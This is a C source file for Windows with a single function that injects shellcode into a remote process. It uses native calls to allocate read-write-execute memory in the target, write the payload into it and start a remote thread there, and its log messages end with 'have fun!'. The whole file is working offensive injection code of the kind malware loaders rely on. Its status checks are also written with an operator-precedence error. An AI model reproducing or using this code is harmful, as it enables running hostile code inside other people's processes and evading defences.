#include <Windows.h>
#include <stdio.h>

#include "Structs.h"
#include "Common.h"
#include "Debug.h"

BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize) {

    PVOID pAddress = NULL;
    NTSTATUS STATUS = 0;
    HANDLE hThread = NULL;
    SIZE_T sBytesWritten = 0;

    CLIENT_ID CID = { (HANDLE)PID, 0 };
    OBJECT_ATTRIBUTES OA = { sizeof(OA), 0 };



    info("allocating buffer in process memory...");
    STATUS = NtAllocateVirtualMemory(hProcess, &pAddress, 0, &sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtAllocateVirtualMemory] failed to allocate memory, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("allocated buffer with PAGE_EXECUTE_READWRITE [RWX] permissions!");



    info("writing payload to allocated buffer...");
    STATUS = NtWriteVirtualMemory(hProcess, pAddress, pShellcode, sShellcodeSize, &sBytesWritten);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWriteVirtualMemory] failed to write to allocated buffer, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("wrote %zu-bytes to allocated buffer!", sBytesWritten);




    info("creating thread, beginning execution");
    STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, 0, 0, 0, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtCreateThreadEx] failed to create thread, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread created!");


    info("waiting for thread to finish executing...");
    STATUS = NtWaitForSingleObject(hThread, FALSE, NULL);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtWaitForSingleObject] failed to wait for thread to finsih, error: 0x%x", STATUS);
        goto CLEANUP;
    }
    okay("thread execute succesfully!");

    goto CLEANUP;

CLEANUP:
    info("clean up, closing thread handle...");
    STATUS = NtClose(hThread);
    if (!STATUS == STATUS_SUCCESS) {
        warn("[NtClose] Unable to close thread handle, error: 0x%x", STATUS);
        return EXIT_FAILURE;
    }
    okay("thread handle closed!");

    okay("cleanup complete! have fun!");
    return TRUE;
}